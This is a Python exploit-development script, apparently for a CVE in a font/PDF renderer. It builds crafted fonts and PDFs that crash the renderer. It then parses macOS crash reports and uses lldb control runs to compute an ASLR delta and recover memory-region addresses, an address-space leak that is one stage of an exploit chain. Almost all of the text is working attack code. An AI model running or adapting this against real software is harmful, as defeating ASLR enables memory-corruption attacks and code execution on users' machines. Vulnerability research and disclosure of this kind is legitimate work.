# RIP-40: ASLR-DELTA LEAK via crash reports (.ips).
# A) lldb control run: x27 ground truth + fa -> Delta = x27 - fa.
# B) SECOND control: Delta process-stability check.
# C) Blind fresh-process probes (same L) -> .ips fa_i (parse "at 0xRAW -> 0xSTRIP")
#    -> Delta_i consistency + top-bits (region) recovery = the leak.
# D) Multi-L blind curve: fa(L) family from crash reports alone vs M3c banked values.
import os, sys, subprocess, glob, time, json, re

CWD = os.path.dirname(os.path.abspath(__file__))
CVE = os.path.abspath(os.path.join(CWD, "..", "cve-2026-86950"))
TRACE = open(os.path.join(CVE, "rip40_trace.txt"), "a")
def T(s): print(s, flush=True); TRACE.write(s + "\n"); TRACE.flush()

os.chdir(CVE)
PY = os.environ.get("RIP40_PY") or os.path.join(CVE, "venv/bin/python")
RENDER = os.path.join(CVE, "render7")
T0 = time.time()

def gen(L):
    r = subprocess.run([PY, "-c", "import sys; sys.path.insert(0,'.'); from gen_k2 import build_font; build_font('probe_%d.ttf', %d)" % (L, L)], cwd=CVE, capture_output=True, timeout=120)
    if r.returncode != 0: return None
    r = subprocess.run([PY, "gen_pdf.py", "probe_%d.pdf" % L, "probe_%d.ttf" % L], cwd=CVE, capture_output=True, timeout=120)
    return "probe_%d.pdf" % L if r.returncode == 0 else None

def ips_new(t0):
    out = []
    for p in glob.glob(os.path.expanduser("~/Library/Logs/DiagnosticReports/render7*.ips")):
        if os.path.getmtime(p) >= t0 - 1: out.append(p)
    return sorted(out, key=os.path.getmtime)

def parse_fa(path):
    try:
        body = json.loads(open(path, errors="ignore").read().split("\n", 1)[1])
        ex = body.get("exception", {})
        sub = ex.get("subtype", "") or ""
        m = re.search(r"at 0x([0-9a-fA-F]+)\s*->\s*0x([0-9a-fA-F]+)", sub)
        if m: return int(m.group(1), 16), int(m.group(2), 16)
        codes = ex.get("rawCodes") or []
        if len(codes) > 1:
            raw = codes[1] & 0xFFFFFFFFFFFFFFFF
            return raw, raw & 0x0000FFFFFFFFFFFF
    except Exception:
        pass
    return None, None

def blind(L, n=1):
    """n fresh-process probes; returns list of (rc, raw_fa, strip_fa)"""
    pdf = gen(L)
    if not pdf: T("gen FAIL L=%d" % L); return []
    res = []
    for i in range(n):
        t0 = time.time()
        before = set(ips_new(T0))
        r = subprocess.run([RENDER, pdf, "b_out.png"], cwd=CVE, capture_output=True, timeout=60)
        rc = r.returncode
        time.sleep(2.0)
        fresh = [x for x in ips_new(T0) if x not in before]
        raw = strip = None
        if fresh:
            raw, strip = parse_fa(fresh[-1])
        res.append((rc, raw, strip))
        T("blind L=%d #%d rc=%s raw=%s strip=%s (%.1fs)" % (L, i, rc, hex(raw) if raw else None, hex(strip) if strip else None, time.time() - t0))
    return res

def control(L):
    pdf = gen(L)
    if not pdf: T("gen FAIL ctl L=%d" % L); return None
    if os.path.exists("rip40_control.txt"): os.remove("rip40_control.txt")
    env = dict(os.environ); env["RIP40_PDF"] = pdf
    try:
        subprocess.run(["lldb", "-b", "./render7",
                        "-o", "command script import %s/control40.py" % CWD],
                       cwd=CVE, capture_output=True, timeout=180, env=env)
    except Exception as e:
        T("ctl lldb EXC %s" % e)
    x27 = fa = None
    try:
        for line in open("rip40_control.txt"):
            if line.startswith("X27="): x27 = int(line.split("=")[1].strip(), 16)
            if line.startswith("FA=") and "none" not in line: fa = int(line.split("=")[1].strip(), 16)
    except Exception: pass
    T("control L=%d x27=%s fa=%s" % (L, hex(x27) if x27 else None, hex(fa) if fa else None))
    return (x27, fa)

T("=== RIP-40 ASLR-DELTA LEAK START ===")
L = 31000
(x27a, faa) = control(L) or (None, None)
(x27b, fab) = control(L) or (None, None)
delta_a = (x27a - faa) if (x27a and faa) else None
delta_b = (x27b - fab) if (x27b and fab) else None
T("DELTA a=%s b=%s STABLE=%s" % (hex(delta_a) if delta_a is not None else None, hex(delta_b) if delta_b is not None else None,
  "YES" if (delta_a is not None and delta_a == delta_b) else "check"))
stable = (delta_a is not None and delta_a == delta_b and 0 < delta_a < (1 << 32))

bl = blind(L, 6)
strips = [s for (_, _, s) in bl if s]
tops = sorted(set(s >> 28 for s in strips))
T("strip-fa tops (fa>>28, GB region): %s" % [hex(x) for x in tops])
T("distinct strip-fa: %d of %d -> per-proc ASLR visible: %s" % (len(set(strips)), len(strips), "YES" if len(set(strips)) > 1 else "NO"))
if stable and delta_a is not None:
    est = [(s + delta_a) >> 28 for s in strips]
    T("recovered-region tops (strip+Delta)>>28 vs control x27>>28=%x: %s" % (x27a >> 28, sorted(set(hex(e) for e in est))))

# multi-L curve (2 blind each)
curve = {}
for LL in (30500, 31500, 32500):
    r = blind(LL, 2)
    curve[LL] = [(raw, strip) for (_, raw, strip) in r if raw]
for LL, v in curve.items():
    T("curve L=%d fa-family: %s" % (LL, [hex(raw)[:14] + "..." for (raw, _) in v]))

T("RESULT: ASLR-LEAK-LANE delta-stable=%s strips=%d tops=%s curve-Ls=%s" % (
  stable, len(set(strips)), [hex(x) for x in tops], sorted(curve)))
T("RIP-40 DONE (%.1fs)" % (time.time() - T0))
TRACE.close()
